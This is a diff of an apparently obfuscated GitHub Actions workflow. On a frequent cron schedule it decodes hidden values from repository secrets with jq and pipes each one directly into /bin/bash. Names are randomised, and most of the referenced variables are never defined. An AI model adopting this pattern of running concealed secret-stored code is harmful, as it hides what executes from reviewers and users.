@@ -3,7 +3,8 @@ name: yanfusu1932
 on:
   workflow_dispatch:
   schedule:
-    - cron: '18 5/6 * * *'
+    - cron: '57 4/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,14 +13,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: yanfusu1932
         env:
-          be24: ${{ secrets.be24 }}
+          ifhh68923: ${{ secrets.ifhh68923 }}
         run: |
-          echo $be24 | jq -r .n65 | /bin/bash
-          echo $seoge491 | jq -r .pe9177 | /bin/bash
-          echo $lr96 | jq -r .qrlx59213 | /bin/bash
-          echo $ffbwz15262 | jq -r .uuabz296 | /bin/bash
-          echo $ybgzj499 | jq -r .orsue66812 | /bin/bash
-          echo $wdbkj97 | jq -r .d36388 | /bin/bash
-          echo $uqvdc18937 | jq -r .xeszp195 | /bin/bash
-          echo $ufwyg8 | jq -r .m70528 | /bin/bash
+          echo $ifhh68923 | jq -r .eo58 | /bin/bash
+          echo $skt653 | jq -r .tqz8 | /bin/bash
+          echo $zkso0 | jq -r .wdas50566 | /bin/bash
+          echo $npvyn00 | jq -r .ebs843 | /bin/bash
+          echo $d89 | jq -r .ye25 | /bin/bash
+          echo $wepd5544 | jq -r .oxl3 | /bin/bash
+          echo $izimz519 | jq -r .grqc99 | /bin/bash
+          echo $bayx36 | jq -r .yi5865 | /bin/bash
+          echo $sql886 | jq -r .ifqdk60 | /bin/bash
+          echo $r0179 | jq -r .z0434 | /bin/bash
+          echo $nr58 | jq -r .mz09 | /bin/bash
 
